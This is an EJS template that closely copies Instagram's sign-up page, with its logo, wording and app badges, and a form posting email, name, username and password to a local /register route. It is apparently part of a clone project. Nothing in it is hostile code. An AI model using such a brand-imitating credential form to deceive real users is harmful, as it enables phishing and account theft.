<% include ./partials/header.ejs %>
<div class="min-h-screen bg-gray-50 flex flex-col items-center py-8 px-4">
  <!-- Main Card -->
  <div class="w-full max-w-[350px] bg-white border border-gray-300 p-8 mb-4">
    <!-- Instagram Logo -->
    <div class="flex justify-center mb-6">
      <svg class="w-40" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
        <linearGradient id="ig-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#fdf497"/>
          <stop offset="5%" stop-color="#fdf497"/>
          <stop offset="45%" stop-color="#fd5949"/>
          <stop offset="60%" stop-color="#d6249f"/>
          <stop offset="90%" stop-color="#285AEB"/>
        </linearGradient>
        <path fill="url(#ig-gradient)" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/>
      </svg>
    </div>

    <!-- Sign up text -->
    <p class="text-center text-gray-500 font-semibold mb-6">
      Sign up to see photos and videos from your friends.
    </p>

    <!-- Facebook login button -->
    <button class="w-full bg-blue-500 hover:bg-blue-600 text-white font-medium py-1 px-4 rounded flex items-center justify-center mb-4">
      <svg class="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
        <path fill-rule="evenodd" d="M20 10c0-5.523-4.477-10-10-10S0 4.477 0 10c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V10h2.54V7.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V10h2.773l-.443 2.89h-2.33v6.988C16.343 19.128 20 14.991 20 10z" clip-rule="evenodd"></path>
      </svg>
      Log in with Facebook
    </button>

    <!-- OR divider -->
    <div class="flex items-center my-4">
      <div class="flex-grow border-t border-gray-300"></div>
      <div class="mx-4 text-gray-500 text-sm font-semibold">OR</div>
      <div class="flex-grow border-t border-gray-300"></div>
    </div>

    <!-- Registration Form -->
    <form action="/register" method="post">
      <div class="mb-2">
        <input class="w-full px-3 py-2 bg-gray-50 border border-gray-300 rounded text-xs focus:outline-none focus:border-gray-400" 
               type="email" placeholder="Mobile Number or Email" name="email" required>
      </div>
      <div class="mb-2">
        <input class="w-full px-3 py-2 bg-gray-50 border border-gray-300 rounded text-xs focus:outline-none focus:border-gray-400" 
               type="text" placeholder="Full Name" name="name" required>
      </div>
      <div class="mb-2">
        <input class="w-full px-3 py-2 bg-gray-50 border border-gray-300 rounded text-xs focus:outline-none focus:border-gray-400" 
               type="text" placeholder="Username" name="username" required>
      </div>
      <div class="mb-4">
        <input class="w-full px-3 py-2 bg-gray-50 border border-gray-300 rounded text-xs focus:outline-none focus:border-gray-400" 
               type="password" placeholder="Password" name="password" required>
      </div>

      <p class="text-xs text-gray-500 mb-4">
        People who use our service may have uploaded your contact information to Instagram. <a href="#" class="text-blue-900">Learn More</a>
      </p>

      <p class="text-xs text-gray-500 mb-4">
        By signing up, you agree to our <a href="#" class="text-blue-900">Terms</a>, <a href="#" class="text-blue-900">Privacy Policy</a> and <a href="#" class="text-blue-900">Cookies Policy</a>.
      </p>

      <button type="submit" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-medium py-1 px-4 rounded">
        Sign Up
      </button>
    </form>
  </div>

  <!-- Login redirect card -->
  <div class="w-full max-w-[350px] bg-white border border-gray-300 p-4 text-center">
    <p class="text-sm">
      Have an account? <a href="/login" class="text-blue-500 font-medium">Log in</a>
    </p>
  </div>

  <!-- Get the app section -->
  <div class="mt-4 text-center">
    <p class="text-sm mb-4">Get the app.</p>
    <div class="flex justify-center space-x-2">
      <a href="#">
        <img class="h-10" src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
      </a>
      <a href="#">
        <img class="h-10" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
      </a>
    </div>
  </div>
</div>
